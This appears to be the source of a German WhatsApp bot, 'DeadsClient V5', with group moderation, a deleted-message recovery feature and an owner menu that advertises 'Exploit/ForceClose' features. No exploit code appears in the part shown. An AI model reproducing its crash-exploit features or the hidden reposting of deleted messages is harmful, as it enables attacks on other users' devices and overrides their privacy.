const access = require('./bot-access');
const settings = require('./settings.js');
const reactionTriggers = require('./reactions');
const { spawn } = require('child_process');
const fs = require('fs');
const chalk = require('chalk');
const { proto, generateWAMessageFromContent, prepareWAMessageMedia, getContentType } = require('@onedevil405/baileys');
const { downloadContentFromMessage } = require('@onedevil405/baileys');
const { makeid } = require('./dev/id');
const crypto = require('crypto');
const pino = require('pino');
const axios = require('axios');
const FormData = require('form-data');
const Jimp = require('jimp');
const dns = require('dns').promises;
const { exec } = require('child_process');
const path = require('path');
const os = require('os');
const tempDir = path.join(os.tmpdir(), 'deadsbase_temp');
const weatherCooldowns = new Map();
const { url, fileSha256, mediaKey, fileEncSha256, directPath, jpegThumbnail, scansSidecar, midQualityFileSha256, thumbnailDirectPath, thumbnailSha256, thumbnailEncSha256} = require('./all.js');
//=================AntiDelete=================//
const nsfwFile = './antinsfw.json';

let antiNSFWGroups = fs.existsSync(nsfwFile)
  ? JSON.parse(fs.readFileSync(nsfwFile))
  : {};

function saveAntiNSFW() {
  fs.writeFileSync(nsfwFile, JSON.stringify(antiNSFWGroups, null, 2));
}

function isNSFWGroup(groupId) {
  return antiNSFWGroups[groupId] === true;
}
//===============================//
const deletedMessagesPath = path.join(__dirname, 'deleted_messages.json');
if (!fs.existsSync(deletedMessagesPath)) {
  fs.writeFileSync(deletedMessagesPath, JSON.stringify({}, null, 2));
}
let deletedMessages = JSON.parse(fs.readFileSync(deletedMessagesPath));
function saveDeletedMessage(msg) {
    const chatId = msg.key.remoteJid;
    const msgId = msg.key.id;
    if (!chatId || !msgId) return;
    if (!deletedMessages[chatId]) {
        deletedMessages[chatId] = {};
    }
    deletedMessages[chatId][msgId] = msg;
    fs.writeFileSync(deletedMessagesPath, JSON.stringify(deletedMessages, null, 2));
}

const antiDeleteConfigPath = path.join(__dirname, 'antidelete_config.json');
if (!fs.existsSync(antiDeleteConfigPath)) {
  fs.writeFileSync(antiDeleteConfigPath, JSON.stringify({}, null, 2));
}
let antiDeleteConfig = JSON.parse(fs.readFileSync(antiDeleteConfigPath));

function saveAntiDeleteConfig() {
  fs.writeFileSync(antiDeleteConfigPath, JSON.stringify(antiDeleteConfig, null, 2));
}
//=================AntiDelete================================================//
const mutedFile = './mutedUsers.json';
let mutedUsers = fs.existsSync(mutedFile)
  ? JSON.parse(fs.readFileSync(mutedFile))
  : {};
function saveMuted() {
  fs.writeFileSync(mutedFile, JSON.stringify(mutedUsers, null, 2));
}
function isUserMuted(groupId, userId) {
  return mutedUsers[groupId]?.includes(userId);
}

//=================================================================//
const warnFile = './warnedUsers.json';
let warnedUsers = fs.existsSync(warnFile)
  ? JSON.parse(fs.readFileSync(warnFile))
  : {};

function saveWarned() {
  fs.writeFileSync(warnFile, JSON.stringify(warnedUsers, null, 2));
}

function addWarning(groupId, userId) {
  if (!warnedUsers[groupId]) warnedUsers[groupId] = {};
  if (!warnedUsers[groupId][userId]) warnedUsers[groupId][userId] = 0;

  warnedUsers[groupId][userId]++;
  saveWarned();
  return warnedUsers[groupId][userId];
}

function resetWarnings(groupId, userId) {
  if (warnedUsers[groupId] && warnedUsers[groupId][userId]) {
    delete warnedUsers[groupId][userId];
    saveWarned();
  }
}

function getWarnings(groupId, userId) {
  return warnedUsers[groupId]?.[userId] || 0;
}
//=================================================================//
const antiLinkFile = './antilinkGroups.json';
let antiLinkGroups = fs.existsSync(antiLinkFile)
  ? JSON.parse(fs.readFileSync(antiLinkFile))
  : {};

const whitelistFile = './antilinkWhitelist.json';
let antiLinkWhitelist = fs.existsSync(whitelistFile)
  ? JSON.parse(fs.readFileSync(whitelistFile))
  : {};

function saveAntiLink() {
  fs.writeFileSync(antiLinkFile, JSON.stringify(antiLinkGroups, null, 2));
}

function saveWhitelist() {
  fs.writeFileSync(whitelistFile, JSON.stringify(antiLinkWhitelist, null, 2));
}

function isWhitelisted(groupId, userId) {
  return antiLinkWhitelist[groupId]?.includes(userId);
}

function addToWhitelist(groupId, userId) {
  if (!antiLinkWhitelist[groupId]) antiLinkWhitelist[groupId] = [];
  if (!antiLinkWhitelist[groupId].includes(userId)) {
    antiLinkWhitelist[groupId].push(userId);
    saveWhitelist();
  }
}

const linkBypassFile = './linkBypassUsers.json';
let linkBypassUsers = fs.existsSync(linkBypassFile)
  ? JSON.parse(fs.readFileSync(linkBypassFile))
  : {};

function saveLinkBypass() {
  fs.writeFileSync(linkBypassFile, JSON.stringify(linkBypassUsers, null, 2));
}

function isBypassed(groupId, userId) {
  return linkBypassUsers[groupId]?.includes(userId);
}
//===============================================//

const welcomeFilePath = './daten/welcome.json';
const welcomeDir = path.dirname(welcomeFilePath);
if (!fs.existsSync(welcomeDir)) {
  fs.mkdirSync(welcomeDir, { recursive: true });
}
let welcomeGroups = {};
if (fs.existsSync(welcomeFilePath)) {
  welcomeGroups = JSON.parse(fs.readFileSync(welcomeFilePath));
}
function saveWelcomeData() {
  fs.writeFileSync(welcomeFilePath, JSON.stringify(welcomeGroups, null, 2));
}
//=================================================================//
//=================================================================//
const farewellDir = './daten/farewell.json/';
const farewellFilePath = path.join(farewellDir, 'farewell.json');

if (!fs.existsSync(farewellDir)) {
  fs.mkdirSync(farewellDir, { recursive: true });
}

let farewellGroups = {};
if (fs.existsSync(farewellFilePath)) {
  farewellGroups = JSON.parse(fs.readFileSync(farewellFilePath));
}

function saveFarewellData() {
  fs.writeFileSync(farewellFilePath, JSON.stringify(farewellGroups, null, 2));
}
//=================================================================//
module.exports = async function (sock) {
  console.log(chalk.green('[✓] 🩸𝑫𝒆𝒂𝒅𝒔𝑪𝒍𝒊𝒆𝒏𝒕𝑽5 𝐠𝐞𝐬𝐭𝐚𝐫𝐭𝐞𝐭🩸'));


  const prefix = '.';
  let mediaImage;

  async function prepareMediaImage() {
    const media = await prepareWAMessageMedia(
      { image: fs.readFileSync('./dev/dead.jpg') },
      { upload: sock.waUploadToServer }
    );
    mediaImage = media.imageMessage;
  }
  await prepareMediaImage();

  const sendReaction = async (jid, msg, emoji) => {
    await sock.sendMessage(jid, {
      react: {
        text: emoji,
        key: msg.key
      }
    });
  };
  
    sock.sendjson = async function (jid, json, options = {}) {
    return await sock.sendMessage(jid, json, options);
  };

  sock.sendjsonv3 = async function (jid, json, options = {}) {
    const message = generateWAMessageFromContent(
      jid,
      proto.Message.fromObject(json),
      {
        logger: sock.logger,
        userJid: sock.user.id,
        ...options
      }
    );
    await sock.relayMessage(jid, message.message, { messageId: message.key.id });
    return message;
  };
  
  
  




 //============================================//  
  sock.sendOfferCall = async (target, isVideo = false) => {
    try {
      await new Promise(res => setTimeout(res, 500));
      console.log(chalk.green.bold(`Attempting to send a ${isVideo ? "video" : "audio"} call offer...`));
      await sock.offerCall(target, isVideo);
      console.log(chalk.white.bold(`Success: Sent ${isVideo ? "video" : "audio"} call offer to ${target}`));
    } catch (error) {
      console.error(chalk.red.bold(`Failed to send ${isVideo ? "video" : "audio"} call offer to ${target}:`, error));
    }
  };
 //============================================//  

  //===================grpWelcome==============================================//
sock.ev.on('group-participants.update', async (update) => {
  const groupId = update.id;
  const participants = update.participants;
  const welcomeData = JSON.parse(fs.readFileSync('./daten/welcome.json', 'utf8'));
  const isWelcomeOn = welcomeData[groupId];

  if (update.action === 'add' && isWelcomeOn) {
    try {
      const groupMeta = await sock.groupMetadata(groupId);
      const groupName = groupMeta.subject;
      const timestamp = new Date().toLocaleString('de-DE', { timeZone: 'Europe/Berlin' });

      for (const user of participants) {
        const tag = '@' + user.split('@')[0];
        const caption = `○◦━🏷©𝑫𝒆𝒂𝒅𝒔𝑪𝒍𝒊𝒆𝒏𝒕𝑽5━◦○\n*🌹 WILLKOMMEN in\n "${groupName}"*\n` +
                        `━━━━━━━━━━━━━━━\n` +
                        `©𝐃𝐞𝐚𝐝𝐬𝐂𝐥𝐢𝐞𝐧𝐭 𝐡𝐞𝐢ß𝐭  ${tag}, 𝐡𝐞𝐫𝐳𝐥𝐢𝐜𝐡 𝐖𝐢𝐥𝐤𝐨𝐦𝐦𝐞𝐧 𝐈𝐧 𝐝𝐞𝐫 𝐆𝐫𝐮𝐩𝐩𝐞\n` +
                        `━━━━━━━━━━━━━━━\n` +
                        `_⏰ ${timestamp}_`;

        let mediaImage = await prepareWAMessageMedia(
          { image: fs.readFileSync('./dev/dead.jpg') },
          { upload: sock.waUploadToServer }
        );
        mediaImage = mediaImage.imageMessage;

 await sock.sendjsonv3(groupId, {
  viewOnceMessage: {
    message: {
      messageContextInfo: {
        deviceListMetadata: {},
        deviceListMetadataVersion: 2,
        messageSecret: crypto.randomBytes(32),
      },
      buttonsMessage: {
        contentText: caption,
        footerText: "○◦━©𝑫𝒆𝒂𝒅𝒔𝑪𝒍𝒊𝒆𝒏𝒕𝑽5━◦○",
        imageMessage: mediaImage,
        buttons: [
          {
            buttonId: "open_submenu",
            buttonText: {
              displayText: "📂 Optionen"
            },
            type: "RESPONSE",
            nativeFlowInfo: {
              name: "single_select",
              paramsJson: JSON.stringify({
                title: "",
                sections: [
                  {
                    title: "Bot Optionen",
                    rows: [
                      {
                        title: "Bot testen",
                        description: "Teste ob der Bot online ist",
                        id: "!ping"
                      },
                      {
                        title: "Owner kontaktieren",
                        description: "Kontaktiere den Bot-Owner",
                        id: "!owner"
                      }
                    ]
                  }
                ]
              })
            }
          }
        ],
        headerType: 4,
        header: "imageMessage"
      }
    }
  }
});
      }

    } catch (err) {
      console.error('Willkommensmenü-Fehler:', err);
    }
  }
});
//====================grpWelcome=============================================//
//====================grpFarewell=============================================//
sock.ev.on('group-participants.update', async (update) => {
  const { id, participants, action } = update;

  if (action === 'remove' && farewellGroups[id]) {
    for (const user of participants) {
      const tag = '@' + user.split('@')[0];
      const goodbyeText = `> ○◦━🏷©𝑫𝒆𝒂𝒅𝒔𝑪𝒍𝒊𝒆𝒏𝒕𝑽5 ━◦○\n👋©𝐃𝐞𝐚𝐝𝐬𝐂𝐥𝐢𝐞𝐧𝐭 𝐬𝐚𝐠𝐭 𝐚𝐮𝐟 𝐖𝐢𝐞𝐝𝐞𝐫𝐬𝐞𝐡𝐞𝐧, ${tag}\n> ○◦━🏷©𝑫𝒆𝒂𝒅𝒔𝑪𝒍𝒊𝒆𝒏𝒕𝑽5 ━◦○`;
      await sock.sendMessage(id, {
        text: goodbyeText,
        mentions: [user]
      });
    }
  }
});
//=================================================================//
//============================AlbumMessag==============================//
sock.sendAlbumMessage = async (target, media = [], contextInfo = {}) => {
    const albumMsg = generateWAMessageFromContent(target, proto.Message.fromObject({
        "albumMessage": {
            "expectedImageCount": 1,
            "expectedVideoCount": 1,
            "contextInfo": contextInfo
        }
    }), {});

    const albumKey = {
        "id": await sock.relayMessage(target, albumMsg.message, { "messageId": albumMsg.key.sender }),
        "remoteJid": target,
        "fromMe": true
    };

    const keys = { "album": albumKey };
    let i = 1;

    for (const medi of media) {
    const filePath = typeof medi === "string" ? medi : medi?.image?.url;

    if (!filePath) {
        console.log("Invalid media object:", medi);
        continue;
    }

    const ext = filePath.split(".").pop().toLowerCase();
    const mimetypes = {
        "jpg": "image/jpeg", "jpeg": "image/jpeg", "png": "image/png",
        "gif": "image/gif", "webp": "image/webp", "mp4": "video/mp4"
    };
    const messagetypes = {
        "jpg": "imageMessage", "jpeg": "imageMessage", "png": "imageMessage",
        "gif": "imageMessage", "webp": "imageMessage", "mp4": "videoMessage"
    };

    const mimetype = medi?.mimetype || mimetypes[ext];
    const type = messagetypes[ext];

    if (!mimetype || !type) {
        console.log("Invalid mimetype:", filePath);
        continue;
    }

    const msg = await prepareWAMessageMedia(
        {
            [type.startsWith("image") ? "image" : "video"]: { url: filePath },
            mimetype,
            ...(medi?.caption && i === 1 ? { caption: medi.caption } : {}) 
        },
        { upload: sock.waUploadToServer }
    );

    const mediaMessage = generateWAMessageFromContent(target, proto.Message.fromObject({
        associatedChildMessage: {
            message: {
                messageContextInfo: {
                    messageSecret: crypto.randomBytes(32),
                    messageAssociation: {
                        associationType: "MEDIA_ALBUM",
                        parentMessageKey: albumKey
                    }
                },
                [type]: { ...msg[type] }
            }
        }
    }), {});

    keys[`media_${i++}`] = {
        id: await sock.relayMessage(target, mediaMessage.message, { messageId: mediaMessage.key.sender }),
        fromMe: true,
        remoteJid: target
    };
}

    return keys;
};
//==================================AlbumMessage======================//
function generateMessageID() {
  return '3EB0' + Math.floor(Math.random() * 1e9).toString(16).toUpperCase();
}



  sock.ev.on('messages.upsert', async (m) => {
    if (!m.messages || !m.messages[0]) return;

    const msg = m.messages[0];
    const from = msg.key.remoteJid;                     
    const isGroup = from.endsWith('@g.us');             
    const isBot = msg.key.fromMe;                       
    const myJid = sock.user.id;                         






  saveDeletedMessage(msg);

  if (msg.message?.protocolMessage?.type === 0) {
    const originalMsgId = msg.message.protocolMessage.key.id;
    console.log(`🗑️ Nachricht gelöscht! Original-ID: ${originalMsgId}`);
    const chatId1 = msg.key.remoteJid; 
    if (!antiDeleteConfig[chatId1]) return;
    

    const chatId = msg.key.remoteJid;
const chatMessages = deletedMessages[chatId];

if (!chatMessages) {
  console.log(`⚠️ Keine gespeicherten Nachrichten für Chat ${chatId}`);
  return;
}

    const originalMessage = chatMessages[originalMsgId];
    if (!originalMessage) {
      console.log(`❌ Originalnachricht mit ID ${originalMsgId} nicht gefunden.`);
      return;
    }

       let originalText = '[Nicht-Textnachricht]';
const om = originalMessage.message;

if (om.conversation) {
  originalText = om.conversation;
} else if (om.extendedTextMessage?.text) {
  originalText = om.extendedTextMessage.text;
} else if (om.imageMessage) {
  if (om.imageMessage.caption) {
    originalText = `[Bild] ${om.imageMessage.caption}`;
  } else {
    originalText = `[Bild ohne Caption]`;
  }
} else if (om.videoMessage) {
  if (om.videoMessage.caption) {
    originalText = `[Video] ${om.videoMessage.caption}`;
  } else {
    originalText = `[Video ohne Caption]`;
  }
} else if (om.stickerMessage) {
  originalText = `[Sticker]`;
} else if (om.documentMessage) {
  originalText = `[Dokument]`;
} else if (om.audioMessage) {
  originalText = `[Audio]`;
} else if (om.contactMessage) {
  originalText = `[Kontakt gesendet]`;
} else if (om.locationMessage) {
  originalText = `[Standort gesendet]`;
} else if (om.buttonsMessage) {
  originalText = om.buttonsMessage.contentText || '[Buttons Nachricht]';
} else if (om.listMessage) {
  originalText = om.listMessage.description || '[Listen-Nachricht]';
}

try {
  const isImage = !!om.imageMessage;
  const isVideo = !!om.videoMessage;
  const isSticker = !!om.stickerMessage;
  const isAudio = !!om.audioMessage;
  const isDocument = !!om.documentMessage;
  const isLocation = !!om.locationMessage;
  const isContact = !!om.contactMessage;

  let mediaType = null;
  let mediaData = null;
  let caption = `🥷 *Gelöschte Nachricht erkannt!*\n👤 *Von:* ${originalMessage.pushName || 'Unbekannt'}\n> by ︻デ═一▸𝐃𝐞𝐚𝐝𝐬𝐂𝐥𝐢𝐞𝐧𝐭`;

  if (isImage) {
    mediaType = 'image';
    mediaData = om.imageMessage;
    if (mediaData.caption) caption += `\n> 🔓💬 *Caption:* ${mediaData.caption}`;
  } else if (isVideo) {
    mediaType = 'video';
    mediaData = om.videoMessage;
    if (mediaData.caption) caption += `\n> 🔓💬 *Caption:* ${mediaData.caption}`;
  } else if (isSticker) {
    mediaType = 'sticker';
    mediaData = om.stickerMessage;
  } else if (isAudio) {
    mediaType = 'audio';
    mediaData = om.audioMessage;
  } else if (isDocument) {
    mediaType = 'document';
    mediaData = om.documentMessage;
    caption += `\n> 🔓📄 *Datei:* ${mediaData.fileName || 'Unbekannt'}`;
  } else if (isLocation) {
    mediaType = 'location';
    mediaData = om.locationMessage;
  } else if (isContact) {
    mediaType = 'contact';
    mediaData = om.contactMessage;
  }
  if (mediaType && mediaData) {
    const stream = await downloadContentFromMessage(mediaData, mediaType);
    let buffer = Buffer.from([]);
    for await (const chunk of stream) {
      buffer = Buffer.concat([buffer, chunk]);
    }
    const messagePayload = {
      [mediaType]: buffer,
    };
    if (mediaType === 'image' || mediaType === 'video') {
      messagePayload.caption = caption;
    } else if (mediaType === 'document') {
      messagePayload.fileName = mediaData.fileName || 'datei.pdf';
      messagePayload.caption = caption;
    }
    await sock.sendMessage(chatId, messagePayload);
    console.log(`✅ Wiederhergestellt (${mediaType}) im Chat: ${remoteJid}`);
  } else {
    await sock.sendMessage(chatId, {
      text: `${caption}\n> 🔓 *Nachricht:* ${originalText}`
    });
    console.log(`✅ Wiederhergestellte Textnachricht im Chat: ${remoteJid}`);
  }
} catch (err) {
  console.error(`❌ Fehler beim Wiederherstellen:`, err);
    }
  }



// ------------------- MESSAGE PARSING ---------------------------------------------------- //
let messageContent = msg.message;
let mtype = getContentType(messageContent);

// Handle viewOnceMessage Wrapper
if (mtype === 'viewOnceMessage') {
  messageContent = messageContent.viewOnceMessage.message;
  mtype = getContentType(messageContent);
}

const contentType = getContentType(messageContent);
let preview = '';
let messageBody = '';

switch (contentType) {
  case 'conversation':
    messageBody = messageContent.conversation || '';
    preview = messageBody;
    break;

  case 'extendedTextMessage':
    messageBody = messageContent.extendedTextMessage.text || '';
    preview = messageBody;
    break;

  case 'pollCreationMessageV3':
    messageBody = `📊 Neue Umfrage: ${messageContent.pollCreationMessageV3.name || 'Unbekannt'}`;
    preview = messageBody;
    break;

  case 'pollUpdateMessage':
    const updates = messageContent.pollUpdateMessage.updates || [];
    const optionVotes = updates.map(u => u.selectedOptions?.join(', ')).join(', ');
    messageBody = `🗳️ Neue Stimmen: ${optionVotes || 'Keine Angaben'}`;
    preview = messageBody;
    break;

  
   case 'extendedTextMessage':
    messageBody = messageContent.extendedTextMessage.text || '';
    preview = messageBody;
    break;

  case 'imageMessage':
    messageBody = messageContent.imageMessage.caption || '';
    preview = `[📷 Bild] ${messageBody}`;
    break;

  case 'videoMessage':
    messageBody = messageContent.videoMessage.caption || '';
    preview = `[📹 Video] ${messageBody}`;
    break;

  case 'audioMessage':
    preview = '[🎧 Audio gesendet]';
    break;

  case 'stickerMessage':
    preview = '[💠 Sticker gesendet]';
    break;

  case 'documentMessage':
    messageBody = messageContent.documentMessage.caption || '';
    preview = `[📄 Dokument] ${messageBody}`;
    break;

  case 'contactMessage':
    preview = '[👤 Kontakt gesendet]';
    break;

  case 'locationMessage':
    preview = '[📍 Standort gesendet]';
    break;

  case 'buttonsMessage':
    messageBody = messageContent.buttonsMessage.contentText || '';
    preview = `[🟦 Button Nachricht] ${messageBody}`;
    break;

  case 'buttonsResponseMessage':
    messageBody = messageContent.buttonsResponseMessage.selectedButtonId || '';
    preview = `[🟦 Button Antwort] ${messageBody}`;
    break;

  case 'listMessage':
    messageBody = messageContent.listMessage.description || '';
    preview = `[📋 Listen-Nachricht] ${messageBody}`;
    break;

  case 'listResponseMessage':
    messageBody = messageContent.listResponseMessage.singleSelectReply?.selectedRowId || '';
    preview = `[📋 Listen-Antwort] ${messageBody}`;
    break;

  case 'templateButtonReplyMessage':
    messageBody = messageContent.templateButtonReplyMessage.selectedId || '';
    preview = `[📨 Template Antwort] ${messageBody}`;
    break;

  case 'interactiveResponseMessage':
    try {
      const interactive = messageContent.interactiveResponseMessage;
      if (interactive.nativeFlowResponseMessage?.paramsJson) {
        const params = JSON.parse(interactive.nativeFlowResponseMessage.paramsJson);
        const selectedId = params.selectedRowId || params.rowId || params.id || '';
        messageBody = selectedId;
        preview = `[⚙️ NativeFlow Antwort] ${selectedId}`;
      } else {
        preview = '[ℹ️ Interaktive Antwort ohne NativeFlow]';
      }
    } catch (err) {
      console.log("Fehler beim Parsen von NativeFlow:", err);
      messageBody = '';
      preview = '[❌ Fehlerhafte NativeFlow Antwort]';
    }
    break;

  case 'interactiveMessage':
    const im = messageContent.interactiveMessage || {};
    const header = im.header?.text || '';
    const body = im.body?.text || '';
    const footer = im.footer?.text || '';
    messageBody = `${header}\n${body}\n${footer}`.trim();
    preview = `[🎛️ Interaktive Nachricht] ${body}`;
    break;

  default:
    preview = '[📨 Unbekannter Nachrichtentyp]';
    messageBody = '';
}
// ------------------------------------------------------------------------------------------- //

    const now = new Date();
    const time = now.toLocaleDateString('de-DE') + ' ' + now.toLocaleTimeString('de-DE', { hour12: false });

    const chatId = msg.key.remoteJid; // Chat-ID (Gruppe oder Privat)
    const isGroupChat = chatId.endsWith('@g.us');
    const chatType = isGroupChat ? 'GRUPPE' : 'PRIVATCHAT';

const senderId = isGroupChat
  ? msg.key.participant || msg.participant
  : chatId;

    let sender;
if (msg.key.fromMe) {
  sender = (msg.key.participant || msg.key.remoteJid || "").split(":")[0];
} else if (isGroupChat && msg.key.participant) {
  sender = msg.key.participant.split('@')[0];
} else {
  sender = chatId.split('@')[0];
}


const cleanedSender = sender.replace(/[^0-9]/g, '');




if (isGroup && antiLinkGroups[from]) {
  const linkRegex = /(https?:\/\/[^\s]+)/gi;
  const senderId = msg.key.participant || msg.key.remoteJid;
  const userId = senderId.split('@')[0];
const groupMetadata = await sock.groupMetadata(from);

const isSenderAdmin = groupMetadata.participants.find(p => p.id === senderId && p.admin);

  const body = msg.message?.conversation ||
               msg.message?.extendedTextMessage?.text ||
               msg.message?.imageMessage?.caption ||
               msg.message?.videoMessage?.caption || '';

  if (linkRegex.test(body) && !isSenderAdmin && !isBypassed(from, userId)) {
    try {
      // Nachricht löschen
      await sock.sendMessage(from, {
        delete: {
          remoteJid: from,
          fromMe: false,
          id: msg.key.id,
          participant: senderId
        }
      });

      // Verwarnen
      

       const warns = addWarning(from, userId);
        if (warns >= 3) {
          await sock.sendMessage(from, {
            text: `❌ @${userId} wurde 3x verwarnt und wird entfernt.`,
            mentions: [senderId]
          });
          await sock.groupParticipantsUpdate(from, [senderId], 'remove');
          resetWarnings(from, userId);
        } else {
          await sock.sendMessage(from, {
            text: `⚠️ @${userId} hat wegen Link-Spam jetzt ${warns}/3 Verwarnungen.`,
            mentions: [senderId]
          });
        }
      } catch (err) {
        console.error('AntiLink Verwarnung Fehler:', err);
      }
    }
  }

const { default: axios } = require('axios');
const body = msg.message?.conversation ||
             msg.message?.extendedTextMessage?.text ||
             msg.message?.imageMessage?.caption ||
             msg.message?.videoMessage?.caption ||
             '';
const lowerBody = body.toLowerCase();
const isPotentialLoop = msg.key.fromMe && body?.includes('©𝐃𝐞𝐚𝐝𝐬𝐂𝐥𝐢𝐞𝐧𝐭'); 
if (isPotentialLoop) return;

if (lowerBody) {
  for (const [trigger, data] of Object.entries(reactionTriggers)) {
    if (lowerBody.includes(trigger)) {
      try {
        const res = await axios.get(`https://g.tenor.com/v1/search?q=${encodeURIComponent(data.search)}&key=LIVDSRZULELA&limit=1`);
        const gifUrl = res.data?.results?.[0]?.media?.[0]?.gif?.url;

        if (gifUrl) {
          const gifBuffer = await axios.get(gifUrl, { responseType: 'arraybuffer' });

          await sock.sendMessage(from, {
            video: gifBuffer.data,
            gifPlayback: true,
            caption: `${data.text} 🩸©𝐃𝐞𝐚𝐝𝐬𝐂𝐥𝐢𝐞𝐧𝐭`, 
            contextInfo: {
              forwardingScore: 999,
              isForwarded: true,
              forwardedNewsletterMessageInfo: {
                newsletterJid: "120363418269042042@newsletter",
                newsletterName: `⭐️©𝐃𝐞𝐚𝐝𝐬𝐂𝐥𝐢𝐞𝐧𝐭⭐️       <---𝐂𝐥𝐢𝐜𝐤 𝐇𝐞𝐫𝐞🩸`
              }
            }
          }, { quoted: msg });
        }
      } catch (err) {
        console.error('❌ GIF Reaction Error:', err);
      }
      break;
    }
  }
}

//========Auto delete======================//
sender = msg.key.participant || msg.key.remoteJid;
const groupId = msg.key.remoteJid
if (groupId.endsWith('@g.us') && isUserMuted(groupId, sender)) {
  try {
    await sock.sendMessage(groupId, {
      delete: {
        remoteJid: groupId,
        fromMe: false,
        id: msg.key.id,
        participant: sender // Wichtig für Gruppenlöschungen
      }
    });
    console.log(`🔇 Nachricht von ${sender} wurde erfolgreich gelöscht.`);
  } catch (e) {
    console.error('❌ Fehler beim Löschen der Nachricht:', e.message);
  }
}
//========Auto delete======================//    
    
    console.log("Incoming message type:", contentType);

    switch (contentType) {
      case 'conversation':
        preview = messageContent.conversation || '';
        break;
      case 'extendedTextMessage':
        preview = messageContent.extendedTextMessage.text || '';
        break;
      case 'imageMessage':
        preview = '[Bild] ' + (messageContent.imageMessage.caption || '');
        break;
      case 'videoMessage':
        preview = '[Video] ' + (messageContent.videoMessage.caption || '');
        break;
      case 'stickerMessage':
        preview = '[Sticker]';
        break;
      case 'interactiveResponseMessage': {
        const interactive = messageContent.interactiveResponseMessage;

        if (interactive?.nativeFlowResponseMessage?.paramsJson) {
          try {
            const params = JSON.parse(interactive.nativeFlowResponseMessage.paramsJson);
            const selectedId = params.selectedRowId || '';
            console.log("NativeFlow Auswahl:", selectedId);
            preview = '[NativeFlow Antwort] ' + selectedId;
          } catch (err) {
            console.log("Fehler beim Parsen von paramsJson:", err);
            preview = '[Fehlerhafte NativeFlow Antwort]';
          }
        } else {
          preview = '[Interaktive Antwort ohne ID]';
        }
        break;
      }
      default:
        preview = '[Unbekannter Nachrichtentyp]';
    }
    
    const boxWidth = 60;
let boxColor = 'red';
try {
  delete require.cache[require.resolve('./box-color.json')]; // Cache löschen!
  boxColor = require('./box-color.json').boxColor || 'red';
} catch (_) {
  boxColor = 'red';
}
const horizontal = '─'.repeat(boxWidth);
const pad = (text = '', width = boxWidth - 4) => {
  const padded = text.padEnd(width);
  return chalk[boxColor](`│`) + ` ${padded} ` + chalk[boxColor](``);
};
const rawTimestamp = msg.messageTimestamp || Math.floor(Date.now() / 1000);
const date = new Date(rawTimestamp * 1000);
const formattedTime = date.toLocaleString('de-DE', { hour12: false });
const id = msg.key.id || '';
const isFromWeb = id.toLowerCase().startsWith('web') || id.toLowerCase().includes('desktop') || id.toUpperCase().startsWith('WA');
const isFromAndroid = !isFromWeb && (id.length > 20 || id.startsWith('BAE')); 
const isFromIOS = !isFromWeb && !isFromAndroid;
const device = isFromWeb ? 'Web' : isFromAndroid ? 'Android' : 'iOS';
const deviceEmoji = isFromWeb ? '💻' : isFromAndroid ? '📱' : '🍏';
let gruppenName = '';
if (isGroup) {
  try {
    const groupMetadata = await sock.groupMetadata(msg.key.remoteJid);
    gruppenName = groupMetadata.subject;
  } catch (e) {
    gruppenName = 'Unbekannte Gruppe';
  }
}
console.log(chalk.bold.underline('Neue Nachricht:'));
console.log(chalk[boxColor](`┌${horizontal}┐`));
console.log(pad(chalk.yellow.bold(`Chat-Type: ${chatType}`)));
if (gruppenName) console.log(pad(chalk.whiteBright(`Gruppe: ${gruppenName}`)));
console.log(pad(chalk.blue(`Time/Date: ${formattedTime}`)));
console.log(pad(chalk.gray(`Chat-ID: ${chatId}`)));     // recipient number
console.log(pad(chalk.magenta(`Ich (Bot): ${myJid}`)));    // OwnerNumber
console.log(pad(chalk.cyan(`Device: ${deviceEmoji} ${device}`)));
console.log(pad(chalk.red(`Message: ${preview}`)));
console.log(chalk[boxColor](`└${horizontal}┘`));



 if (!messageBody.startsWith(prefix)) return;



    const commandBody = messageBody.slice(prefix.length).trim();
    const args = commandBody.split(/\s+/);
    const command = args.shift().toLowerCase();
    const q = args.join(' ').trim();
    const reply = (text) => sock.sendMessage(from, { text }, { quoted: msg });



    console.log(chalk.blue(`[Command] From: ${myJid}`));
    console.log(chalk.magenta(`> Command: ${command}`));
    console.log(chalk.magenta(`> Args: ${args.join(' ')}`));

//========================================================//



switch (command) {

//=================ownerCase==============//
case 'owner': {
  const {
    owner,
    bot,
    admins,
    links,
    system,
    branding,
    forwardedNewsletter,
    features,
    debug,
    statusQuoted
  } = settings;

  const adminsList = admins.map(num => `• ${num} ${num === owner.number ? '(👑 Owner)' : ''}`).join('\n');

  const premiumList = features.modules.filter(f => f.access === 'private');
  const exploitList = features.modules.filter(f => f.command?.includes('xforce') || f.name?.toLowerCase().includes('exploit'));

  const featureList = features.modules.map((f, i) => (
    `*${i + 1}.* ${f.name}\n` +
    `   ⤷ ${f.description}\n` +
    `   ⤷ Befehl: \`${f.command}\`\n` +
    `   ⤷ Datei: \`${f.file}\`\n` +
    `   ⤷ Zugriff: *${f.access === 'private' ? '🔒 Premium/Privat' : '🌐 Öffentlich'}*\n`
  )).join('\n');

  const text = `
🩸🔪 *Willkommen bei ${bot.name}* (v${bot.version})

👤 *Owner*
• Name: ${owner.name}
• Nummer: +${owner.number}
• Telegram: ${owner.telegram}
• Instagram: ${owner.insta}

⚙️ *Bot Einstellungen*
• Prefix: ${bot.prefix}
• Version: ${bot.version}
• Release: ${bot.releaseDate}
• Beschreibung: ${bot.description}
• Sprache: ${bot.language}

💻 *System*
• OS: ${system.os}
• Node: ${system.nodeVersion}
• Uptime: ${system.uptime()}
• Umgebung: ${system.env}
• Zeitzone: ${system.timezone}

🧑‍💻 *Admins*
${adminsList}

🔐 *Premium/Privat Features*
• Anzahl: ${premiumList.length}
• Beispiele: ${premiumList.map(p => p.command).slice(0, 3).join(', ') || '–'}

🧨 *Exploit/ForceClose Features*
• Anzahl: ${exploitList.length}
• Beispiele: ${exploitList.map(x => x.command).slice(0, 3).join(', ') || '–'}

📂 *Log-System*
• Aktiv: ${debug.enabled ? '✅ Ja' : '❌ Nein'}
• Log-to-File: ${debug.logToFile ? '📁 Aktiv' : '📁 Inaktiv'}

🌐 *Support*
• Channel: ${links.supportChannel}

📦 *Features Übersicht*
${featureList}

🄲 ${branding.copyright} | Lizenz: ${branding.license}
`.trim();

  await sock.sendMessage(from, {
    image: { url: 'https://i.postimg.cc/ZK40fpV0/IMG-20250702-WA0000.jpg' },
    caption: text,
    contextInfo: {
      forwardingScore: 999,
      isForwarded: true,
      forwardedNewsletterMessageInfo: {
        newsletterJid: forwardedNewsletter.jid,
        newsletterName: forwardedNewsletter.name
      }
    }
  }, { quoted: statusQuoted });

  break;
}
//=================ownerCase==============//

//==========================Allgemeine Funktionen=======================//
case 'addaccess': {
